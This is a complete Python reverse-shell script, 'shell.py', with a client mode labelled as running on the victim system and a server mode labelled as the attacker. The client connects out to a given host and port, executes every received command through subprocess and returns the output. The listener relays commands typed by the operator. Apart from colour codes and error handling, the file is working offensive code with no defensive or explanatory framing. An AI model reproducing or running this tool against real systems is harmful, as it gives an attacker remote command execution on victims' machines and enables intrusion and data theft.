#!/usr/bin/python
import socket
import sys
import subprocess


class Colors:
    Black = '\u001b[30m'
    Red = '\u001b[31m'
    Green = '\u001b[32m'
    Yellow = '\u001b[33m'
    Blue = '\u001b[34m'
    Magenta = '\u001b[35m'
    Cyan = '\u001b[36m'
    White = '\u001b[37m'

    Background_Black = '\u001b[40m'
    Background_Red = '\u001b[41m'
    Background_Green = '\u001b[42m'
    Background_Yellow = '\u001b[43m'
    Background_Blue = '\u001b[44m'
    Background_Magenta = '\u001b[45m'
    Background_Cyan = '\u001b[46m'
    Background_White = '\u001b[47m'

    Bold = '\u001b[1m'
    Underline = '\u001b[4m'
    Reversed = '\u001b[7m'

    Reset = '\u001b[0m'


# argv ----------------------------------------------------------------------
if len(sys.argv) == 1:  # Print Help page
    print(Colors.Bold + "Usage: " + Colors.Reset)
    print("./shell.py [Options] <host> <port>")
    print(Colors.Bold + "\tOptions: " + Colors.Reset)
    print("\t-c : Client mode (Target)")
    print("\t-s : Server mode (Attacker)")
    sys.exit()
else:
    mode = sys.argv[1]
    host = sys.argv[2]
    port = int(sys.argv[3])

# Main ----------------------------------------------------------------------
BUFFER_SIZE = 1024  # 1KB buffer

try:
    if mode == "-c":  # client.py ; Runs on Victim System
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 - TCP
        sock.connect((host, port))

        while True:
            cmd = sock.recv(BUFFER_SIZE).decode()
            if cmd.lower() == "exit":
                break
            # Execute & send Output
            output = subprocess.getoutput(cmd) #TODO split output that is more than BUFFER_SIZE
            sock.sendall(output.encode())

        sock.close()


    elif mode == "-s":
        print(Colors.Bold + Colors.Cyan + "Shell.py v1.0" + Colors.Reset) # Print Banner
        print("-"*60)

        #Start Server, socket(); bind(); listen();
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((host, port))
        sock.listen()
        print("[*] listening as", Colors.Bold + host + ":" + str(port) + Colors.Reset, "...")

        conn, addr = sock.accept() # Target Connected
        print("[*] Connected to", addr)

        while True:
            cmd = input(Colors.Bold + ">")
            print(Colors.Reset)
            conn.send(cmd.encode())
            if cmd.lower() == "exit":
                break
            results = conn.recv(BUFFER_SIZE).decode()
            print(results)

        conn.close()
        sock.close()

except socket.gaierror:
    print(Colors.Red + "IP/Hostname couldn't be resolved!" + Colors.Reset)
    sys.exit()
except socket.error:
    print(Colors.Red + "Socket Sucked!" + Colors.Reset)
    sys.exit()
except KeyboardInterrupt: #TODO interrupting after connection doesn't close sockets
    print(Colors.Red + "\nInterrupted  ^C" + Colors.Reset)
    sys.exit()
